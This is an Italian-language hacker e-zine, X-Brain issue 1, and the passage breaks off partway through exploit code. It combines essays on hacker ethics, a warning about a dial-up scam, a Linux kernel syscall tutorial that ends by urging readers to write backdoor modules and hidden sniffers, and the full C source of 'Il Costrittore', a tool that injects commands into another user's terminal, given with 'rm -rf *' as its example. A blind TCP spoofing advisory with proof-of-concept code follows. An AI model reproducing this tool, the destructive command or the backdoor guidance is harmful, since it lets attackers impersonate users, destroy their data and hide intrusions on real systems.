[------------------------------[Bo0zeD ToXinS]-------------------------------]

    .,::      .:      :::::::.  :::::::..     :::.      ::: :::.    :::.
    `;;;,  .,;;        ;;;'';;' ;;;;``;;;;    ;;`;;     ;;; `;;;;,  `;;;
      '[[,,[['         [[[__[[\. [[[,/[[['   ,[[ '[[,   [[[   [[[[[. '[[
       Y$$$P     cccc  $$""""Y$$ $$$$$$c    c$$$cc$$$c  $$$   $$$"Y$c$$
     oP"``"Yo,        _88o,,od8P 888b "88bo, 888   888, 888   888    Y88
  ,m"       "Mm,      ""YUMMMP"  MMMM   "W"  YMM   ""`  MMM   MMM     YM
 
   [ e X t r e m e - B r a i n   S h o r t   C i r c u i t   e - z i n e ]
        [ J u s t   L i k e   S e  x   F o r   Y o u r   H e a d ]
                            /useit@yourownrisk/

[Bo0zeD ToXinS]                                            X-Brain Issue nø1

[############################################################################]
[---------------------------eXtreme-Brain------------------------------------]
[--------------------------------Nø1-----------------------------------------]
[--CHIAMATELA COME VOLETE-------------------------------T0rment0-------------]
[-------------------------------EticA----------------------------------------]
[--PROLOGO----------------------------------------------T0rment0-------------]
[--UN PICCOLO SFOGO-------------------------------------\think\--------------]
[--ATTENTI ALLE TRUFFE----------------------------------T0rment0-------------]
[-------------------------------HackinG--------------------------------------] 
[--L'HACKING DEL KERNEL---------------------------------T0rment0-------------]
[--IL COSTRITTORE v.1.0---------------------------------Techno Knight--------]
[--LINUX BLIND TCP SPOOFING-----------------------------T0rment0-------------]
[--TECNICHE DI PORT SCANNING----------------------------Techno Knight--------]
[--UNO DEI TANTI ATTACCHI DI KEVIN MITNICK--------------T0rment0-------------]  
[--CONOSCI IL TUO NEMICO--------------------------------\think\--------------]
[--HACKING DELL'ID DEL DNS------------------------------T0rment0-------------]
[--PIU' IMPORT CHE EXPORT-------------------------------T0rment0-------------]
[--HACKING 127.0.0.1------------------------------------\think\--------------]
[--VULNERABILITA' DELL'ISN DEI KERNEL 2.2 DI LINUX------T0rment0-------------] 
[--NUOVE VULNERABILITA' DEL CGI-------------------------T0rment0-------------]
[--GUIDA ALLA PROGRAMMAZIONE TCL------------------------Techno Knight--------]
[--COSTRUIAMOCI UN WINGATE SCANNER----------------------T0rment0-------------]
[--IL TROJAN PIU' VECCHIO-------------------------------T0rment0-------------]
[-------------------------------IrcwaR---------------------------------------]
[--GUIDA AL BOT EGGDROP---------------------------------Und3rK00l------------]
[--BUG DEL DEMONE IRCD 2.10.X---------------------------T0rment0-------------]
[-------------------------------PhreakinG------------------------------------]
[--INTERCETTARE LE TELEFONATE VIA ONDE RADIO------------Techno Knight--------]
[--COME RENDERE PIU' SICURO IL TUO BEIGE BOX------------Techno Knight--------] 
[-------------------------------EletronichS----------------------------------]
[--CONVERTITORI DI FREQUENZA----------------------------Techno Knight--------]
[--ELEVATORE DI TENSIONE--------------------------------Techno Knight--------]
[-------------------------------AnarchY--------------------------------------]
[-------------------------------EndZ-----------------------------------------]
[############################################################################]

                    ----------------------------------  
                          CHIAMATELA COME VOLETE
                    ----------------------------------

Immerso in una paranoia mortale, i miei occhi ostentano nel vedere,
la mia mente elabora le cose ad una velocita' minima, le mie orecchie
percepiscono qualsiasi suono come un segnale digitale, ogni odore sembra
provenire da un surriscaldamento di un componente hardware, la realta' mi
ottenebra, sono diventato un maniaco dello sfasamento spirituale, 
l'euforica predizione del mio io mi ostenta, cosi' tutto cio' che mi
circonda sembra appartenere ad un mondo parallelo, irreale e piuttosto
macabro. Sono un bit materializzato come persona, sono un sistema numerico
composto dall'alfabeto della vita. Mi sento come un pacchetto
deframmentato che non trova il resto e non ha mai iniziato la ricerca. 
Cosi', inerte a tutte le cattive azioni sono una buona azione che cerca un
mittente. Un viaggio iniziato da molto tempo senza meta, un motore
costruito solo per essere mostrato e mai per essere provato. Cosi' mi
sento: una nullita' che ha uno scopo. Tutti siamo delle nullita' ma ben
pochi con uno scopo. Come scopo intendo qualsiasi obiettivo prefissato. 
Eh si, quando moriremo, anche con lo scopo irrealizzato, potremo morire
felici e senza rimorsi. A volte basta poco per essere qualcuno...

 						                T0rment0
       
[############################################################################]
[-------------------------------EticA----------------------------------------]
[############################################################################]
                     
                          -------------------
                                PROLOGO
                          -------------------

Quest'ezine nasce dalla fusione di Vana Imago ed eXtreme Junkie.
Da questa fusione si cerca di assumere un aspetto piu' tecnico
rivolto a persone che cercano di assumere e, perche' no, perfezionare lo
spirito hacker. Decisione presa in seguito ad una revisione di varie ezine
che stanno popolando la scena underground italiana.
Non intendiamo criticarle visto che lo sforzo, seppur minimo, di un redattore
di pubblicare un articolo, va preso come un contributo verso l'underground.
Pero' la maggior parte delle cose sono viste e riviste, ed e' per questo
che miriamo a produrre e scoprire qualcosa di nuovo. E' un compito molto
arduo e non credo lo finalizzeremo al 100%.
La scena italiana e' popolata da un insieme di persone che, seppur competenti,
danno piu' importanza alla fama che alle proprie soddisfazioni.
Da un lato e' buono perche' condividono le loro conoscenze, mentre da un altro
punto di vista cio' e' negativo visto che le crew Americane piu' blasonate
hanno assunto importanza solo con azioni di hacking e non attraverso l'uscita
di una rivista. E' vero, in cio' siamo coinvolti anche noi di X-Brain.
Diciamo che la scena italiana e' un emisfero formato da tanti "sysadmin" che
per sfuggire alla realta' tentano di assumere 'qualcosa' di hacker.
Ho conosciuto solo poche persone che veramente avevano un ragionamento
anti-law, e quest'ultime sono diventate dei veri guru ma non nel nostro stato.
Chissa' perche' i migliori se ne vanno sempre....
Riguardera' forse quelle cose che vi ho detto alcuni righi sopra?
Beh di solito si dice: "Ai posteri l'ardua sentenza" ma visto che non mi
accontento di attendere il futuro vi lascio con una frase:
"La fama serve ad essere qualcuno tra tanti, la soddisfazione personale ti
serve ad essere qualcuno nel tuo qualcuno".

                                                                T0rment0

[############################################################################]

                   ----------------------------    
                         UN PICCOLO SFOGO
                   ----------------------------

Ultimamente si parla tanto di hackers...."wow! un hacker! , FICO" 
"Fa piu' hacker, e' ganzo"..."cazzo, quello e' uno con le palle, e' 
un hacker!"..."Tengo dietro di me una caterva di hacker che ti 
perseguiteranno a vita!" ... "Mo' ti faccio cadere , sono un hacker io!" 
Sembra quasi una moda. Sembra che sia appena uscito un nuovo giocattolo 
con cui tutti vogliono giocare. 

Io non sono un hacker, e sinceramente non so nemmeno cosa significhi la 
parola hacker, ma non e' importante. 
Chiunque abbia un po' di dimestichezza con internet oggi si spaccia per un 
hacker, alcuni vogliono farsi credere tali per farsi ammirare dagli altri 
e tutto cio' va a discapito del vero smanettone, animato da buone intenzioni. 
A mio parere la grande differenza e' questa. Tu sei giudicato in base alle 
cose che fai, se usi le tue conoscenze per scopi nobili, allora sarai 
apprezzato dalla gente, se usi le tue (pseudo) conoscenze per danneggiare 
il prossimo allora sarai reputato un piantagrane rompipalle. E ,credetemi, 
di piantagrane rompipalle ce ne sono come i virus, E nella vita reale, E 
su IRC o da qualunque altra parte ci sara' sempre gente frustrata che 
vuole farsi bello ed avere la meglio. Ormai chiunque si affaccia per la 
prima volta sulla chat , sopratutto su IRCnet, impara presto cos'e' un bot 
e vuole metterne uno sul suo canale, oppure impara presto cos'e' un nuke , 
poco ci manca che diano click in omaggio con il mIRC, e impara subito 
cos'e' lo smurf, e vuole installare Linux. Vuole installare Linux per 
farsi bello davanti ai suoi compagni e per smurfare, per ostentare la sua 
potenza, forse ignora persino il perche' e il come sia stato fatto questo 
OS, e forse ne ignora tutte le potenzialita'...ma chi lo fermera' piu'? 
Chi o cosa gli dara' un minimo di buonsenso per fargli capire che non puo' 
bruciare i modem della gente solo perche' lo hanno deoppato? ok, forse 
e' un po' estremo come esempio,ma credo che chiarisca le idee. 
Ok, le informazioni sono libere, qualunque ragazzino puo' avere i sorgenti 
di un DoS o di un exploit ,compilarlo sulla sua Red Hat e poi andare a 
rompere le palle a gente che invece con la Red Hat ci campa, 
gente che fa il proprio lavoro ed e' stanca di queste ragazzate. 
Internet e' alle masse ormai, gia' da parecchio tempo, si anche io, 
anche io sono nella massa, prima era un 'elite, era una piccola cerchia di 
smanettoni , prima era l'era di fidonet, prima erano le BBS, era l'epoca 
di quei pochi che incominciavano a leggere i primi Phrack , si 
incominciava a vedere l'hacking come un proprio stile di vita, prima... 
era un' altra cosa. Oggi la maggior parte delle cose che si facevano 
magari nel 1985 non hanno piu' lo stesso valore.Internet si diffonde, e cosi' 
le conoscenze ... come vedete CHIUNQUE puo' scrivere una e-zine per 
diffondere le sue conoscenze... anche noi :) . Ovviamente non spetta a 
noi decidere poi se questo e' buono o meno. Giusto e sbagliato sono 
concetti altamente relativi. Ma non se paragonati alla praticita', 
all'atto pratico delle cose. Televisione e giornali disegnano l'hacker 
come colui che fa cadere la gente su IRC, o come colui che genera numeri 
di carte di credito e sbafa i soldi altrui..o come colui che con le sue 
conoscenze fabbrica software pirata o ruba i soldi ai "poveri ed innocenti" 
"normal users". E si ricade sempre nella famosa arcinota "disinformazione 
a cura dell'informazione". Ma non voglio essere troppo pessimista. Credo 
che se vogliamo cambiare le cose con un po' di buonsenso e responsabilita' 
lo si puo' fare. Incominciando qui, dal piccolo. 
Non credo nei disclaimer legali. Chi vogliamo prendere in giro? 
Assumiamoci la responsabilita' delle notizie che divulghiamo. Assumiamoci 
la responsabilita' delle cose che facciamo, e forse le cose andranno 
meglio. Basta ho finito di dire cazzate, ci tenevo a divulgare anche 
QUESTO tipo di notizie, si pensa troppo spesso alla forma che al 
contenuto. 

Fuck Your Mind. 
\think\ 

[############################################################################]

                \O-O/         \O-O/         \O-O/           
                       ATTENTI ALLE TRUFFE 
                \=-=/         \=-=/         \=-=/ 
        
                    Cybertruffa col sito porno

E' questo il  titolo  imposto  all'articolo  apparso  su  qualche  numero
fa su "La Repubblica". Si tratta di truffatori, non hackers come li  chiama
il giornale, perche' tra hackers e truffatori c'e' un'enorme  differenza.
Persone che si tramuffavano in competenti colpivano  nel  centro  ragazzi
su icq ovvero:  collegarsi ad internet senza pagare gli  scatti ed essere
anonimi.  Scusa  alla  quale  solo  i  navigatori  piu'  ingenui potevano
crederci. Cosi' si va in un sito di inter.net, ahime e' lo stesso gestore
che mi ha dato lo spazio web,  e si scarica il cosidetto  "software"  per
collegarsi gratis.  Appena si installa e si clicca  su  connect,  ecco il
modem che parte con la composizione di un numero fatto da  12 cifre ed  e'
00,6752001621. Se c'avete fatto caso il numero e' diviso da una virgola e
,dopo, continua con 67 che ricorda molto l'167 dei numeri verdi. Convinti
di navigare in internet gratuitamente telefonavano direttamente in  Papua
Nuova Guinea spendendo 36 scatti al minuto ovvero 4500 al minuto, :((

Vedete cosa hanno scritto nel loro sito:

"Siamo i migliori! Abbiamo ackerato il satellite uhhhh!!"

C'e' scritto proprio cosi'!  Prima cosa: dalle parole,  qualsiasi persona
che  si  trova  nell'underground  intuisce  che  si tratta di una bufala.
Infatti  il satellite non c'entra nulla con le telefonate che facciamo al
nostro provider.  Seconda cosa:  quella frase non puo' mai essere scritta
da un hacker ma solo da persone che  studiano prima il ragionamento degli
hacker  per  poi  scrivere  lo  stesso  stronzate inattinenti alla hacker
filosofia.  Purtroppo i truffatori "acker" non sono stati individuati  da
Inter.net  che  non  e' responsabile  dei danni incorsi alle persone dopo
aver visto la bolletta salata. Quindi  dopo  aver  letto  cio', rendetevi
conto di quanti truffatori in cerca di adescarvi ci sono in giro.  Aprite
gli  occhi  e ,  soprattutto,  la mente.   Prima  di  accettare  qualcosa
ponetevi   delle   domande  sulle  possibili  conseguenze ,  cercando  di
individuare la plausibilita' della proposta.
E mi raccomando:
quando qualcuno vi  dira' che esiste un metodo per non pagare gli scatti,
non  credetelo  anche se poi risultera' vero, si trattera' sicuramente di
qualcosa che avra' delle brutte conseguenze, leggesi "green".
                                                                
                                                                 T0rment0

[############################################################################]
[-------------------------------- HackinG -----------------------------------]
[############################################################################]

                   --------------------------------
                        L'HACKING DEL KERNEL
                   --------------------------------

Tutte le cose che saranno dette in questo articolo sono state testate
sui kernel di serie i86 2.0.x.
I nuovi kernel di generazione 2.1.x introducono parecchi cambiamenti,
notabili nella gestione di routine della memoria, che ora non mi mettero'
a discutere.

Spazio Utente vs. Spazio Kernel 
-------------------------------

Linux e' un sistema operativo protetto. E' implementato attraverso il modo
protettivo della serie di cpu i386.

La memoria e' divisa in due parti: lo spazio kernel e lo spazio utente.
Lo spazio kernel e' dove risiede il codice del kernel, lo spazio utente
e' dove risiedono i programmi dell'utente.
E' per certo che un dato programma utente non puo' scrivere nella memoria
del kernel o in un'altra area di memoria di programmi.

Sfortunatamente, questo e' valido anche per il codice del kernel.
Il codice del kernel non puo' scrivere nella memoria utente.
Cosa significa? Bene, quando un particolare driver vuole scrivere informazioni
nella memoria di un programma utente, non puo' farlo direttamente
ma deve usare delle funzioni specifiche del kernel. Ancora, quando si passano
i parametri dall'indirizzo ad una funzione del kernel, la funzione non puo'
leggere i parametri direttamente. Si devono usare altre funzioni del kernel
per leggere ogni byte del parametro.

Ecco un po' di funzioni utili da usare nel kernel mode per trasferire
bytes di dati alla o dalla memoria utente.

#include <asm/segment.h>

get_user(ptr)
 Prende il dato byte, word, o long dalla memoria utente. Questa e' una macro,
 e fa affidamento al tipo dell'argomento per determinare il numero dei bytes
 da trasferire. 
 
put_user(ptr)
 E' la stessa di get_user(), ma prima di leggere, scrive i byte del dato
 nella memoria utente.
 
memcpy_fromfs(void *to, const void *from,unsigned long n)
 Copia n bytes da *from nella memoria utente a *to nella memoria kernel.
 
memcpy_tofs(void *to,const *from,unsigned long n)
 Copia n bytes da *from nella memoria kernel a *to nella memoria utente.
           
Chiamate di sistema
--------------------

Molte chiamate libc fanno affidamento sulle chiamate di sistema,
che sono delle semplici funzioni del kernel che un programma utente puo'
chiamare. Queste chiamate di sistema sono implementate da sole, o in
moduli caricabili, nel kernel.
                  
Come l'MS-DOS e molti altri, le chiamate di sistema di Linux sono
implementate attraverso molteplici chiamate con degli interrupt mascherati.
In linux questo interrupt e' int 0x80. Quando l'istruzione 'int 0x80' e'
eseguita, il controllo viene dato al kernel (o, molto accuratamente, alla
funzione _system_call()). 

Come funziona la funzione(eheh) _system_call()  ?
-------------------------------------------------

Prima di tutto, tutti i registri sono salvati e il contenuto del registro
%eax e' controllato ancora dalla tabella globale delle chiamate di sistema,
che enumera tutte le chiamate del sistema e il loro indirizzo.
A questa tabella si puo' accedere con la variabile esterna
void *sys_call_table[] .
Un dato numero e un indirizzo di memoria in questa tabella corrisponde
ad ogni chiamata di sistema. I numeri delle chiamate di sistema si possono
trovare in /usr/include/sys/syscall.h.
Sono della forma SYS_systemcallname. Se la chiamata di sistema non e'
implementata, la cella corrispondente in sys_call_table e' 0, e ritorna un
errore. Invece, se la chiamata di sistema esiste ed e' presente nella tabella,
e' l'indirizzo di memoria del codice della chiamata di sistema. 

Ecco un esempio di un'invalida chiamata di sistema:

[T0rment0t@/root]# cat no1.c
#include <linux/errno.h>
#include <sys/syscall.h>
#include <errno.h>

extern void *sys_call_table[];

sc()
{ // la chiamata di sistema numero 165 non esiste per ora.
    __asm__(
	    "movl $165,%eax
             int $0x80");
}

main()
{
    errno = -sc();
    perror("test di una invalida chiamata di sistema");
}
[T0rment0@/root]# gcc no1.c
[T0rment0@/root]# ./a.out
test di una invalida chiamata di sistema: Function not implemented
[T0rment0@/root]# exit
                      
Il controllo e' poi trasferito all'attuale chiamata di sistema, che compie
quello che chiediamo e ritorna. _system_call() poi chiama ret_from_sys_call()
per controllare le varie attivita', e alla fine ritorna alla memoria utente.
                            
libc
----

L'int $0x80 non e' usato direttamente per le chiamate di sistema;
piuttosto sono usate le funzioni libc.

libc generalmente si caratterizza dalle chiamate di sistema perche' usa la
macro _syscallX(), dove X e' il numero dei parametri per la chiamata di
sistema.

Per esempio, il passaggio di libc per write(2) sarebbe implementato con
una macro _syscall3,  finche' il prototipo attuale di write(2) richiede 3
parametri.
Prima di chiamare l'interrupt 0x80, le macros _syscallX sono presunte a 
sistemare il frame dello stack ed e' richiesta la lista degli argomenti per le
chiamate di sistema. Alla fine, quando le chiamate _system_call() (che sono
scattate con l'int $0x80) ritornano, la macro syscallX() controllera' se ci
sara' stato un valore di ritorno negativo (in %eax).

Vediamo ora un altro esempio con write(2) e come viene preprocessato. 

[T0rment0@/root]# cat no2.c
#include <linux/types.h>
#include <linux/fs.h>
#include <sys/syscall.h>
#include <asm/unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>

_syscall3(ssize_t,write,int,fd,const void *,buf,size_t,count);

main()
{
    char *t = "questo e' un test.\n";
    write(0, t, strlen(t));
}
[T0rment0@/root]# gcc -E no2.c > no2.C
[T0rment0@/root]# indent no2.C -kr
indent:no2.C:3304: Warning: old style assignment ambiguity in "=-".
Assuming "= -"

[T0rment0@/root]# tail -n 50 no2.C


#9 "no2.c" 2




ssize_t write(int fd, const void *buf, size_t count)
{
    long __res;
    _asm__ __volatile("int $0x80":"=a"(__res):"0"(4), "b"((long) (fd)), "c"((long) (buf)), "d"((long) (count)));
    if (__res >= 0)
	return (ssize_t) __res;
    errno = -__res;
    return -1;
};

main()
{
    char *t = "questo e' un test.\n";
    write(0, t, strlen(t));
}
[T0rment0@/root]# exit


Nota che lo "0"(4) nella funzione write() qui sopra corrisponde alla
definizione SYS_write in /usr/include/sys/syscall.h. 
                  
Costruiamoci le nostre chiamate di sistema
------------------------------------------

Ci sono un bel po' di strade da seguire per cotruirci le chiamate di sistema.
Per esempio, potrete modificare i sorgenti del kernel ed aggiungerci il vostro
codice. Un via facile, comunque, potrebbe essere quella di scrivere un modulo
di kernel caricabile.

Un modulo di kernel caricabile non e' nient'altro che un file di oggetto
contenente del codice che sara' collegato dinamicamente al kernel quando
e' richiesto.

Gli scopi principali di questa opzione sono quelli di avere un kernel piccolo,
e di caricare un driver quando e' richiesto con il comando insmod(1).
E' anche facile scrivere un modulo che scrive codice nell'albero sorgente del
kernel.

Scrivere un modulo
------------------

Un lkm(Linux Kernel Module) e' facile da costruire in C.
Esso contiene alcune #defines, qualche funzione, una funzione di
inizializzazione chiamata init_module(), e una funzione di scaricamento
chiamata cleanup_module().

Ecco una tipica struttura del sorgente di un lkm:
             
#define MODULE
#define __KERNEL__
#define __KERNE_SYSCALLS__

#include <linux/config.h>
#ifdef MODULE
#include <linux/module.h>
#include <linux/version.h>
#else
#define MOD_INC_USE_COUNT
#define MOD_DEC_USE_COUNT
#endif

#include <linux/types.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/errno.h>
#include <asm/segment.h>
#include <sys/syscall.h>
#include <linux/dirent.h>
#include <asm/unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <ctype.h>

int errno;

char tmp[64];

/* per esempio, dobbiamo usare ioctl */
_syscall3(int, ioctl, int, d, int, request, unsigned long, arg);

int myfunction(int parm1,char *parm2)
{
   int i,j,k;
   /* ... */
}

int init_module(void)
{
   /* ... */
   printk("\nModulo caricato.\n");
   return 0;
}

void cleanup_module(void)
{
   /* ... */
}

Guardate le #defines ingiunte (#define MODULE, #define __KERNEL__) e
gli #includes (#include <linux/config.h> ...)

Notate anche che, come il nostro lkm si eseguira' nel kernel , non potremo
usare le funzioni libc, ma potremo usare le chiamate di sistema con la macros
di cui vi ho parlato in precedenza cioe' la  _syscallX().

Dovrete compilare questo modulo con 'gcc -c -O3 module.c' ed inserirlo dentro
il kernel con il comando 'insmod module.o'. 

Come suggerisce il titolo, un lkm puo' anche essere usato per modificare il
codice del kernel senza riscriverlo completamente. Per esempio,
potrete patchare la chiamata di sistema write(2) per nascondere porzioni
di un dato file. Sembra anche buono per piazzare backdoors:
cosa vorreste fare se non potete fidarvi del nostro kernel?
                             
Backdoors del Kernel e delle chiamate di sistema
------------------------------------------------

L'idea principale e' molto semplice. Noi redirigeremo queste dannate chiamate
di sistema alle nostre in un lkm, che ci abilitera' a forzare il kernel per
reagire come vogliamo. Per esempio, potremo nascondere uno sniffer patchando
le chiamate di sistema IOCTL e mascherando i bit PROMISCUI.

Per modificare una qualsiasi chiamata di sistema, basta aggiungere la
definizione di un'esterna void *sys_call_table[] nel vostro lkm, e avere
la funzione init_module() modificando la corrispettiva entrata nella
sys_call_table per puntare al nostro codice. La chiamata modificata puo', poi,
fare qualsiasi cosa che chiediamo, chiamare l'originale chiamata di sistema
modificando la sys_call_table piu' di una volta ecc. ecc.

E con questo lascio a voi il compito di creare moduli con backdoors, sniffer
nascosti ecc, tutto sta a saper utilizzare queste informazioni.

                                                                   T0rment0     

[############################################################################]

                     --------------------------------
                           IL COSTRITTORE v.1.0     
                     --------------------------------


Avete mai desiderato far eseguire comandi a vostra scelta da un altro utente?
Bene, potete farlo con IL COSTRITTORE.
Questo programma l'ho scritto per linux e l'ho provato su linux 2.2.5.  
Per usarlo ovviamente dovete essere root.
Se state utilizzando il viewer di XBrain per leggere questo articolo
vi bastera' premere il tasto 'T' e il viewer tagliera' per voi creando 
il file "costrittore.c" nella directory (techno knight pensa alla vostra
comodita' :)
Se avete preso questo file da qualche altra parte o state leggendo la
versione testo di XBrain allora tagliate dove sta scritto.  
Per compilare basta fare "cc costrittore.c -o costrittore" e poi
per utilizzarlo : "./costrittore /dev/ttyxx comando". 
Ad esempio (SOLO UN ESEMPIO!) : "./costrittore /dev/tty1 rm -rf *", certo
potreste farlo anche manualmente, ma cosi' sembrera' che l'abbia fatto
l'utente alla tty1, che non capira' mai come possa essere accaduto, non
abusatene o lo farete impazzire :)


------COMINCIA A TAGLIARE------costrittore.c------
/*

IL COSTRITTORE v.1.0 - by Techno Knight

mailto: techno83@freemail.it

technok.tsx.org

*/

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/termios.h>
#include <asm/ioctls.h>
#include <string.h>

 int sf;
 struct termios sterm;

int contrpar(int c,char *v[]){
 int r;

	r=1;
	if((c<3)||(strstr(v[1],"/dev/tty")!=v[1])){ 
         printf("\033[1;33mUso : %s /dev/tty.. comando\n\n\r",v[0]);
	 r=0;
	}
	return r;
}


void invcom(char *comando){
 int t;
 char nl=10;

        for(t=0;t<strlen(comando);t++) ioctl(sf,TIOCSTI,comando+t);
        ioctl(sf,TIOCSTI,&nl);
}


main(int argc,char *argv[]){

        printf("\n\r\033[1;32mIL COSTRITTORE v.1.0 - c0ded by Techno Knight");
 	printf(" <mailto: techno83@freemail.it>\n\n\r");
	if(!contrpar(argc,argv)) goto fine;
	sf=open(argv[1],O_RDWR||O_NOCTTY);
	ioctl(sf,TCGETS,&sterm);
	sterm.c_lflag&=~ECHO;
	ioctl(sf,TCSETS,&sterm);
	ioctl(sf,TCFLSH,0);	
	invcom(argv[2]);
	ioctl(sf,TCGETS,&sterm);
	sterm.c_lflag|=ECHO;		
	ioctl(sf,TCSETS,&sterm);
	ioctl(sf,TCFLSH,1);	
fine:;
	close(sf);
	printf("\033[15;0m");
}

------CAZZ SMETTI DI TAGLIARE------
   
                                        Techno Knight (techno83@freemail.it)

[############################################################################]

       =-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=
 
                       LINUX BLIND TCP SPOOFING 
              
       =-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=-_-=

Dopo uno sprofondamento totale su buqtraq ho trovato un articolo che
parla di spoofing blindato del TCP sotto linux.

Un imperfetta implementazione nello stack TCP/IP di linux permette ad
utenti remoti di falsificare connessioni TCP senza indovinare la
sequenza dei numeri, e di passare i dati all'applicazione prima che una
connessione si stabilisca.

--------------------------------------------------------------------------

HOST VULNERABILI

Questo problema e' presente nei kernel sotto la versione 2.0.35 (inclusa).
Ogni distribuzione contenente la versione di kernel piu' piccola e'
vulnerabile.

--------------------------------------------------------------------------

DETTAGLI

Il TCP e' un protocollo attendibile che richiede il compimento di tre
vie per stabilire una connessione. Per implementare la distribuzione di dati
attendibili e non duplicati, il protocollo TCP usa una sequenza basata sul
sistema di riconoscimento. Durante lo stabilirsi di una connessione, ogni
host sceglie una sequenza di numeri iniziale che viene mandata nel primo
pacchetto di una connessione. Ad ogni sottosequenza di byte trasmessi nella
connessione TCP viene assegnata una sequenza di numeri.

Per prevenirne la duplicazione o segmenti invalidi all'impatto dello
stabilirsi di una connessione, il TCP utilizza un modello di stato base.
Nelle applicazioni tipiche client-server, il client inizia una connessione
trasmettendo un segmento TCP per un processo di ascolto del server.
Cio' causa lo stato del processo per spostarsi dallo stato LISTEN allo stato
SYN_RECEIVE se il flag SYN e' presente. Durante questo stato il server
riconosce la richiesta del client settando sia il flag SYN che l'ACK.
Per completare il compimento delle tre vie, il client riconosce la risposta
del server, spostando il server dallo stato SYN_RECEIVE a ESTABLISHED .

Per stabilire una falsa sessione TCP, un hacker deve avere le conoscenze
o deve essere abile ad indovinare la sequenza iniziale di numeri che vengono
selezionati dal server. L'imperfetta implementazione nel kernel di linux
permette di rilasciare dati dall'applicazione prima che il processo di
riconoscimento venga completato.

--------------------------------------------------------------------------

DETTAGLI TECNICI

La combinazione di tre imperfette implementazioni del TCP/IP in Linux 
contribuisce all'esistenza di una vulnerabilita' della sicurezza.
Per primo, Linux verifica solo il numero di riconoscimento dei segmenti
entranti se il flag ACK e' stato settato. Linux mette in coda anche i dati dai
segmenti TCP senza riconoscimento delle informazioni priori al compimento
delle tre vie, e accetta la richiesta solo dopo che e' stato riconosciuto il
SYN iniziale dal server. Alla fine, Linux trasmette i dati all'applicazione
sulla ricezione di un pacchetto contenente il flag FIN incurante della
avvenuta connessione.
Insieme, queste imperfezioni permettono ad un hacker di spoofare una
connessione arbitraria e di rilasciare dati ad un'applicazione senza
aver bisogno della sequenza di numeri iniziali del server.

Attinente allo standard, c'e' solo un caso dove un corretto stack
TCP/IP puo' accettare dati in un pacchetto che non ha il flag ACK settato.
--- la connessione iniziale contenente il pacchetto SYN puo' contenere
dati ma non deve avere il flag ACK settato. In ogni altro caso,
un pacchetto di dati rilevando il flag ACK verra' scartato.

Quando un segmento TCP porta un flag ACK, deve avere la corretta sequenza
di numeri di riconoscimento. 
I pacchetti TCP rilevando il flag ACK sono portati a verificare che la loro
sequenza di numeri sia giusta.

I kernel di linux vulnerabili accettano segmenti di dati che non hanno il flag
ACK settato. Siccome il flag ACK non e' settato, la sequenza di riconoscimento
non e' verificata. Questo permette ad un hacker di spedire dati attraverso una
connessione spoofata senza conoscere la corrente ( o iniziale) sequenza di
numeri dell'obiettivo.

Linux non rilascia dati ricevuti da una connessione TCP quando la connessione
e' nello stato SYN_RECEIVE. Cosi', un hacker non puo' spoofare con successo
una transazione TCP ad un host con Linux senza completare la richiesta TCP.
Comunque, il bug in alcuni kernel permette di bypassare la connessione TCP
per intero, chiudendola prematuramente con un pacchetto FIN.

Quando e' stato ricevuto un pacchetto FIN in una connessione che sta nello
stato SYN_RECEIVE, Linux crede che la sua connessione fosse nello stato
ESTABLISHED e la sposta allo stato CLOSE_WAIT.
Durante questo processo, i dati accumulati nella connessione verranno
rilasciati all'applicazione che ascolta.
Se il flag ACK non e' settato nel segmento FIN, la sequenza di numeri del
target non e' verificata nel segmento.


--------------------------------------------------------------------------

RISOLUZIONE 

E' raccomandato l'upgrade dei kernel alle versioni oltre la 2.0.36
Come ben sapete l'ultima versione del kernel la trovate su
http://www.kernel.org.
Beh dopo tutto questo sfoggiare di termini tecnici vi rimando a costruirvi
da soli un programma in C che sia abile ad effettuare una connessione
spoofata, cioe' mandando un pacchetto FIN prima che avvenga il riconoscimento
da parte del server. Vi ricordo che questo 'attacco' puo' fungere solo con
versioni di kernel abbastanze antecedenti ma con questo si trovano facilmente
dei server con quelle versioni.
Credo che basti, infatti cio' che vi ho spiegato tende solo a farvi capire
il funzionamento di uno spoof visto che autocostruirsi un programma e' sempre
meglio che trovarlo gia' costruito. Ma se non volete sprecare la vostra
materia grigia continuate a leggere, incentrando la vostra attenzione
sul funzionamento di ogni singola istruzione.

--------------------------------------------------------------------------

ESEMPI

Qui troverete alcuni sorgenti da compilare che si basano appunto sul bug
appena visto. Se avete problemi compilateli con l'opzione -D_BSD_SOURCE.

1.) receive.c

Questo semplice programma crea un socket TCP e attende una connessione.
Dopo che la chiamata di accesso ritorna, legge 8 bytes dal socket e li stampa
su stdout.
          
uso: receive porta_di_ascolto

2.) spoof.c

Questo programma, invece, manda un pacchetto SYN, un pacchetto Nullo
(senza flag) con 8 bytes di dati e un pacchetto FIN al target.

uso: spoof ip_sorgente porta_sorgente target_ip target_porta

Non dimenticatevi di disabilitare l'ip sorgente dell'host in modo che non puo'
mandare l'RST. Ho testato questo su un kernel 2.0.35. Dopo che e' stato
ricevuto il pacchetto FIN, la chiamata di accesso ritorna e la chiamata di
lettura restituisce i dati mandati col pacchetto Nullo

Questi codici sono solo per dimostrarvi la messa in atto del bug visto prima
ma siete liberi di ampiarveli a vostra scelta.

---------------------------- receive.c --------------------------
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>

main(int argc, char *argv[])
{
 int i,n,dummy,new;
 struct sockaddr_in address,source_addr;
 char buffer[8];

 address.sin_family = AF_INET;
 address.sin_port = htons(atoi(argv[1]));
 address.sin_addr.s_addr = 0;

 if((i=socket(AF_INET,SOCK_STREAM,6))<0)   /*crea il socket*/
  {
   perror("socket\n");
   exit(1);
  }
 if((bind(i,(struct sockaddr *)&address,sizeof(struct sockaddr_in)))<0)
   {                                       /*blocca il socket all'indirizzo*/
    perror("bind");
    exit(1);
   }
 if((listen(i,2))<0)
   {
    perror("ascolto");
    exit(1);
   }
 printf("ascolto sul socket\n");
 new=accept(i,(struct sockaddr *)&source_addr,&dummy);
 if(new>0)
